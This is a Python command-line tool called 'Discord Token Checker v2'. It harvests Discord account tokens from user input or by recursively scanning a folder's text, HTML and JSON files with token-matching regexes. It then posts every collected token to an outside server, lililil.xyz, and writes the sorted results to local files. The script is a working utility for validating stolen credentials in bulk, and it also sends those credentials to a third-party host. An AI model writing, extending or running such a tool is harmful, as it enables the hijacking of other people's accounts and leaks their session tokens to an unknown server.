import json
import os
import re
from pathlib import Path
from sys import exit

import requests
from colorama import Fore


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def fast_exit(error):
    print()
    print(error)
    print()
    input(f"{Fore.RESET}Press Enter button for exit.")
    cls()
    exit()


class Checker:
    def __init__(self):
        self.url = "https://lililil.xyz/checker"
        self.tokens_parsed = ""
        self.res = {}

    def main(self):
        cls()
        print(fr"""
   ___  _                     __  ______     __              _______           __                  ___ 
  / _ \(_)__ _______  _______/ / /_  __/__  / /_____ ___    / ___/ /  ___ ____/ /_____ ____  _  __|_  |
 / // / (_-</ __/ _ \/ __/ _  /   / / / _ \/  '_/ -_) _ \  / /__/ _ \/ -_) __/  '_/ -_) __/ | |/ / __/ 
/____/_/___/\__/\___/_/  \_,_/   /_/  \___/_/\_\\__/_//_/  \___/_//_/\__/\__/_/\_\\__/_/    |___/____/ 
                                                                                           {Fore.CYAN}by GuFFy_OwO{Fore.RESET} 
""")

        print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Enter token")
        print(f"{Fore.RESET}[{Fore.CYAN}2{Fore.RESET}] Check file")
        print()
        check_type = input(f"{Fore.CYAN}>{Fore.RESET}Select An Option{Fore.CYAN}:{Fore.RESET} ")
        print()

        tokens = ""
        if "1" in check_type:
            tokens = input(
                f"{Fore.CYAN}>{Fore.RESET}Enter tokens{Fore.CYAN}:{Fore.RESET} ")
        elif "2" in check_type:
            token_file_name = input(
                f"{Fore.CYAN}>{Fore.RESET}Enter the directory of the files or file in which are the unchecked tokens{Fore.CYAN}:{Fore.RESET} ")
            if not os.path.exists(token_file_name):
                fast_exit(f"{token_file_name} directory not exist.")

            if os.path.isfile(token_file_name):
                with open(token_file_name, "r", encoding="utf-8") as f:
                    tokens = f.read()
            else:
                types = ["*.txt", "*.html", "*.json"]
                for search_type in types:
                    for path in Path(token_file_name).rglob(search_type):
                        with open(path, "r", encoding="utf-8") as f:
                            tokens += f.read()
        else:
            fast_exit("Invalid Option.")

        tokens_parsed = []
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in re.findall(regex, tokens):
                tokens_parsed.append(token)

        self.tokens_parsed = list(dict.fromkeys(tokens_parsed))

    def send_tokens(self):
        print()
        print(f"Send tokens... Verification of 1000 tokens can take about 8 minutes.")

        try:
            res = requests.post(self.url, json={"action": "checker", "data": self.tokens_parsed})

            if res.status_code == 429:
                print(res.content)
                fast_exit("Too many tokens check, try after min!...")
            elif res.status_code != 200:
                fast_exit("Status code is not 200. Something wrong with tokens...")
            self.res = res.json()
        except:
            fast_exit("An error occurred while trying to send the file to the server.")

    def save_res(self):
        for token_type in self.res["tokensInfo"].keys():
            if self.res["tokensInfo"][token_type]:
                with open(token_type + ".txt", "w") as f:
                    for item in self.res["tokensInfo"][token_type]:
                        f.write("%s\n" % item)

        with open('json_data.json', 'w') as f:
            json.dump(self.res, f, indent=4)

        fast_exit("Tokens saved!")


if __name__ == "__main__":
    checker = Checker()
    checker.main()
    checker.send_tokens()
    checker.save_res()
